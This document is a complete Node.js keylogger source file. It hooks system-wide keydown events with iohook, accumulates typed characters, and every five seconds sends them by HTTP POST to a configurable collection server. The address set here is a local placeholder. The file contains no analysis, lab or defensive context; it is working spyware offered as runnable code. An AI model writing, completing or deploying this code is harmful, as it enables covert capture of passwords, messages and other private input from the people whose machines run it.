// Import necessary modules
const axios = require('axios');
const ioHook = require('iohook');

// Keylogger class definition
class Keylogger {
  constructor(interval, url) {
    // Initialize class variables
    this.log = ''; // Log for storing keystrokes
    this.interval = interval * 1000; // Interval for sending logs to server in milliseconds
    this.url = url; // URL of the server to send logs
    this.timer = null; // Timer variable for sending logs at intervals

    // Start capturing key presses
    ioHook.on('keydown', event => {
      // Check if the pressed key is a printable character
      if (event.keychar) {
        this.processKeyPress(event.keychar); // Process the pressed key
      }
    });

    ioHook.start(); // Start the keylogger
    console.log('Keylogger started. Press Ctrl+C to stop.'); // Display message indicating keylogger is running
  }

  // Method to process each key press
  processKeyPress(key) {
    // Append the pressed key to the log
    this.log += key;

    // If the timer is not running, start it to send logs to server at intervals
    if (!this.timer) {
      this.timer = setInterval(() => {
        this.sendLogToServer(); // Send logs to server
      }, this.interval);
    }
  }

  // Method to send logs to server
  sendLogToServer() {
    // Send log to server via POST request
    axios.post(this.url, { log: this.log })
      .then(() => {
        console.log('Log sent successfully.'); // Display success message on sending log
        this.log = ''; // Clear log after sending
      })
      .catch(error => {
        console.error('Error sending log:', error.message); // Display error message if log sending fails
      });
  }

  // Method to stop keylogger
  stop() {
    // Stop sending log to server
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
    }

    // Stop capturing key presses
    ioHook.removeAllListeners('keydown');
    ioHook.stop();

    console.log('Keylogger stopped.'); // Display message indicating keylogger is stopped
    process.exit(); // Exit the process
  }
}

// Instantiate Keylogger with interval of 5 seconds and server URL
const keylogger = new Keylogger(5, 'http://0.0.0.0:3000/server');

// Handle SIGINT (Ctrl+C) to stop the keylogger
process.on('SIGINT', () => {
  keylogger.stop(); // Call the stop method to stop the keylogger
});
